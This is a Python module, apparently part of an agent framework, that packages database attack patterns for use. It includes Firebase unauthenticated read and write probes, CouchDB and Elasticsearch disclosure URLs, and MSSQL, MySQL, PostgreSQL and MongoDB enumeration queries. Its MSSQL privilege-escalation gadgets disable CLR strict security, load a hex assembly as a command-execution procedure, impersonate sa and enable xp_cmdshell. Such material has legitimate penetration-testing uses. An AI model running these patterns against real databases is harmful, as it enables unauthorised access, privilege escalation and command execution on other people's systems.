#!/usr/bin/env python3


# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from typing import List, Dict, Any


class DatabaseIntelligence:
    """Intelligence engine for database enumeration and exploitation (SQL Server, MySQL, etc.)."""

    @staticmethod
    def get_cloud_db_exposure_patterns() -> Dict[str, Dict]:
        """Discovery and exploitation patterns for cloud-based databases (Ported from firebaseExploiter)."""
        return {
            "firebase": {
                "read_test_url": "https://{app_id}.firebaseio.com/.json",
                "write_test_method": "PUT",
                "write_test_payload": '{"vuln_check": "insecure_access_detected"}',
                "config_regex": (
                    r"\"apiKey\":\s*\"([^\"]+)\",\s*\"authDomain\":\s*\"([^\"]+)\","
                    r"\s*\"databaseURL\":\s*\"([^\"]+)\""
                ),
            },
            "couchdb": {
                "unauth_access_url": "http://{host}:5984/_all_dbs",
                "config_disclosure_url": "http://{host}:5984/_config",
            },
            "elasticsearch": {
                "index_list_url": "http://{host}:9200/_cat/indices?v",
                "mapping_disclosure_url": "http://{host}:9200/_mapping",
            },
        }

    @staticmethod
    def get_mssql_recon_queries() -> Dict[str, str]:
        """SQL queries for MSSQL enumeration (Port 1433)."""
        return {
            "get_databases": "SELECT name FROM master.dbo.sysdatabases",
            "get_linked_servers": "SELECT name, product, provider, data_source FROM sys.servers",
            "get_exec_on_linked": "SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER')",
            "check_xp_cmdshell": "SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'",
            "check_rpc_out": "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = 'LINKED_SERVER'",
            "check_user_context": "SELECT SYSTEM_USER; SELECT USER_NAME();",
            "check_trustworthy": "SELECT name, is_trustworthy_on FROM sys.databases;",
            "check_impersonation": (
                "SELECT distinct b.name FROM sys.server_permissions a "
                "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
                "WHERE a.permission_name = 'IMPERSONATE';"
            ),
        }

    @staticmethod
    def get_mssql_privesc_gadgets() -> Dict[str, Any]:
        """Advanced gadgets for MSSQL privilege escalation and code execution."""
        return {
            "clr_assembly_exec": {
                "desc": "Create a CLR assembly from hex to bypass xp_cmdshell restrictions.",
                "setup": [
                    "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                    "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;",
                    "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;",
                ],
                "create_assembly": "CREATE ASSEMBLY myAssembly FROM 0x4D5A...; -- (Ported from yolo-mssqlclient)",
                "create_procedure": (
                    "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) "
                    "AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];"
                ),
            },
            "sp_start_job": "EXEC msdb.dbo.sp_start_job @job_name = '...'; -- Blind execution via SQL Agent",
            "impersonate_sa": "EXECUTE AS LOGIN = 'sa';",
        }

    @staticmethod
    def get_mssql_enable_xp_cmdshell() -> List[str]:
        """Commands to enable xp_cmdshell (requires sysadmin)."""
        return [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
        ]

    @staticmethod
    def get_postgres_recon_queries() -> Dict[str, str]:
        """SQL queries for PostgreSQL enumeration (Port 5432)."""
        return {
            "get_version": "SELECT version()",
            "get_databases": "SELECT datname FROM pg_database",
            "get_tables": "SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname != 'pg_catalog'",
            "get_roles": "SELECT usename FROM pg_user",
        }

    @staticmethod
    def get_mysql_recon_queries() -> Dict[str, str]:
        """SQL queries for MySQL enumeration (Port 3306)."""
        return {
            "get_version": "SELECT @@version",
            "get_databases": "SHOW DATABASES",
            "get_users": "SELECT user FROM mysql.user",
            "get_file_priv": "SELECT user, file_priv FROM mysql.user WHERE user = 'CURRENT_USER'",
        }

    @staticmethod
    def get_mongodb_recon_commands() -> List[str]:
        """Commands for MongoDB enumeration (Port 27017)."""
        return ["db.adminCommand('listDatabases')", "db.getUsers()", "db.getCollectionNames()"]
